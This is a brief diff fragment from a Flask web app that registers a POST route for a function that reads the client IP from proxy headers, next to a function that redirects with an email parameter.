@@ -215,7 +215,7 @@ def first():
         return redirect(url_for('benza', web=email))
 
 
-
+@app.route("/second", methods=['POST'])
 def second():
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or \
